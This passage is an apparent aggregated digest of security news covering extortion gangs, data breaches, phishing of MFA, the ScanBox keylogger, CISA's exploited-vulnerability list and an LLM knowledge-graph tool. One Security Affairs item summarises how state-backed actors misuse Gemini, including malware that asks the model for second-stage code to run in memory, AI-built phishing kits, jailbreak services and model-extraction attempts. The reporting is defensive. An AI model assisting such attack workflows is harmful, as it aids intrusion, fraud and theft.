“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000
Link: https://threatpost.com/student-loan-breach-exposes-2-5m-records/180492/

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

“Security measures such as MFA can appear secure… but it is clear that attackers can overcome them with relatively simple tools,” researchers wrote.

“This is yet another phishing attack showing how easy it is for adversaries to bypass supposedly secure multifactor authentication,” Roger Grimes, data-driven defense evangelist at KnowBe4, wrote in a statement via email. “It simply does no good to move users from easily phish-able passwords to easily phish-able MFA. It’s a lot of hard work, resources, time, and money, not to get any benefit.”

To mitigate 0ktapus-style campaigns, the researchers recommended good hygiene around URLs and passwords, and using FIDO2-compliant security keys for MFA.

“Whatever MFA someone uses,” Grimes advised, “the user should be taught about the common types of attacks that are committed against their form of MFA, how to recognize those attacks, and how to respond. We do the same when we tell users to pick passwords but don’t when we tell them to use supposedly more secure MFA.”

[13] Security Affairs - Google: state-backed hackers exploit Gemini AI for cyber recon and attacks
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 639 kelime]
Google DeepMind and GTIG report a rise in model extraction or “distillation” attacks aimed at stealing AI intellectual property, which Google has detected and blocked. While APT groups have not breached frontier models, private firms and researchers have tried to clone proprietary systems. State-backed actors from North Korea, Iran, China, and Russia use AI for research, targeting, and phishing. Threat actors also test agentic AI, AI-powered malware like HONESTCUE, and underground “jailbreak” services.

Threat actors now use large language models to craft polished, culturally accurate phishing messages that remove common red flags like poor grammar. They also run “rapport-building” phishing, holding realistic multi-step conversations to gain trust before delivering malware.

Google reported that North Korea-linked hacker group UNC2970 used its Gemini AI model to gather intelligence on targets and support cyber operations. The company also said other threat groups now weaponize generative AI to speed up attack stages, run information operations, and even attempt model extraction attacks.

“The North Korean government-backed actor UNC2970 has consistently focused on defense targeting and impersonating corporate recruiters in their campaigns. The group used Gemini to synthesize OSINT and profile high-value targets to support campaign planning and reconnaissance.” reads the report published by Google. “This actor’s target profiling included searching for information on major cybersecurity and defense companies and mapping specific technical job roles and salary information. “

Iran-linked group APT42 also used generative AI tools like Gemini to boost reconnaissance and targeted social engineering. The group searched for official email addresses, researched organizations to build believable pretexts, and created tailored personas based on target biographies. The nation-state actor also used AI for language translation and understanding local context. Google disrupted the activity and disabled related assets.

In September 2025, Google tracked new malware called HONESTCUE that uses the Gemini API to generate malicious C# code on demand. Instead of storing full payloads, the malware sends prompts to Gemini, receives source code for a second-stage downloader, compiles it in memory with .NET tools, and executes it without writing files to disk. This fileless approach helps evade detection. Attackers also host payloads on platforms like Discord CDN. Researchers believe a single actor or small group is testing this AI-assisted malware as a proof of concept.

In November 2025, GTIG found COINBAIT, a phishing kit built with help from AI. It pretends to be a major crypto exchange to steal login details. Some of the activity links to UNC5356, a group known for SMS and phone phishing. The kit was likely created using Lovable AI and built as a complex React website. It includes detailed “? Analytics:” logs that show how it tracks and steals data. The attackers hid their systems behind Cloudflare and trusted services to avoid detection. COINBAIT shows a move toward modern web tools and cloud services, may be used by different groups, and also connects to AI-hosted ClickFix scams that trick users into installing malware like ATOMIC.

Underground forums show strong demand for AI tools built for cybercrime. Since most threat actors cannot build their own models, they rely on established services like Gemini. One example, Xanthorox, claimed to be a private custom AI for malware and phishing, but it actually ran on commercial and open-source AI tools layered together.

Attackers need stolen API keys to scale abuse, creating risks for organizations using cloud AI services. Criminals often exploit weak security in open-source AI platforms to steal and resell API keys, fueling a black market.

Google disabled accounts linked to this abuse and continues strengthening safeguards, threat detection, red teaming, and secure AI development through frameworks like SAIF and research projects such as Big Sleep and CodeMender.

“The potential of AI, especially generative AI, is immense. As innovation moves forward, the industry needs security standards for building and deploying AI responsibly.” concludes Google.

[TAM METİN - 358 kelime]
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added SolarWinds Web Help Desk, Notepad++, Microsoft Configuration Manager, and Apple devices flaws to its Known Exploited Vulnerabilities (KEV) catalog.

The first flaw added to the catalog is a Microsoft Configuration Manager SQL Injection Vulnerability tracked as CVE-2024-43468. An unauthenticated attacker could send specially crafted requests to the system and trigger unsafe processing, allowing them to execute commands on the server or underlying database.

The second flaw added to the catalog is a Notepad++ Download of Code Without Integrity Check tracked as CVE-2025-15556. Vulnerability. Notepad++ versions before 8.8.9 using WinGUp have a flaw where updates aren’t verified. An attacker intercepting update traffic can make the updater run a malicious installer, allowing arbitrary code execution with the user’s privileges.

The third flaw added to the catalog is a security control bypass vulnerability, tracked as CVE-2025-40536, that could allow an unauthenticated attacker to access certain restricted functionality within Web Help Desk. While more limited in scope than the critical flaws, successful exploitation could still expose sensitive features and weaken the application’s overall security posture.

The last flaw added to the catalog is an Apple Multiple Buffer Overflow Vulnerability tracked as CVE-2026-20700.

This week, Apple released updates for iOS, iPadOS, macOS, watchOS, tvOS, and visionOS to address an actively exploited zero-day tracked as CVE-2026-20700. The flaw is a memory corruption issue in Apple’s Dynamic Link Editor (dyld) that lets attackers execute arbitrary code on vulnerable devices.

Google’s Threat Analysis Group discovered and reported the issue, a circumstance that suggests the flaw may have been exploited by nation-state actors or commercial spyware vendors in attacks in the wild.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the vulnerabilities by March 5, 2026, except CVE-2025-40536, which must be solved by February 15, 2026.

[TAM METİN - 423 kelime]
Hackers broke into Dutch telecom firm Odido and accessed data from 6.2 million accounts. The company confirmed the breach and said attackers took names, addresses, phone numbers, email addresses, bank account details, dates of birth, and passport or ID numbers.

“Odido has been hit by a cyberattack, which compromised customer data. This involved personal data from a customer contact system used by Odido. No passwords, call logs, or billing information were affected.” reads a notice published by the company on its website. “The unauthorized access to the system was terminated as quickly as possible. Odido also engaged external cybersecurity experts to assist with implementing additional security measures as part of the incident response.”

The telco said the breach did not expose My Odido account passwords, call records, location data, invoice details, or scans of ID documents.

Odido’s subsidiary Ben also warned its customers that hackers may have stolen their information.

Odido is a Dutch telecommunications company and one of the largest mobile network operators in the Netherlands. It was formed when T-Mobile Netherlands and Tele2 were rebranded as Odido in 2023 after private equity firms Apax Partners and Warburg Pincus acquired the business.

Odido serves around 8 million mobile subscribers and about 1 million fixed broadband customers nationwide. The company provides mobile telephony, wireless broadband, and related services under multiple brands including Odido, Ben, and Simpel.

Financially, Odido generates around €2 billion in annual revenue, with growth in consumer broadband and business mobile services contributing to its topline

The telco discovered the hack last weekend and reported it to the Dutch privacy watchdog. The company said it quickly stopped the unauthorized access and brought in cybersecurity experts to strengthen its defenses.

“The unauthorised access to the system was ended as quickly as possible,” the company said in a statement. “In addition, Odido has brought in cybersecurity experts to implement additional security measures in response to this incident.”

The company urges customers to stay alert for suspicious activity. Criminals may use stolen details to pose as Odido, banks, or other companies through calls, texts, or emails. Avoid clicking unknown links and check senders carefully. Verify unexpected calls by contacting the company directly using official numbers. Never share passwords or PINs. Review invoices closely, as scammers may send fake payment requests. When in doubt, check your account or contact customer support.

The company did not disclose technical details about the attack.

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelved after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[19] SANS ISC - AI-Powered Knowledge Graph Generator &#x26; APTs, (Thu, Feb 12th)

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

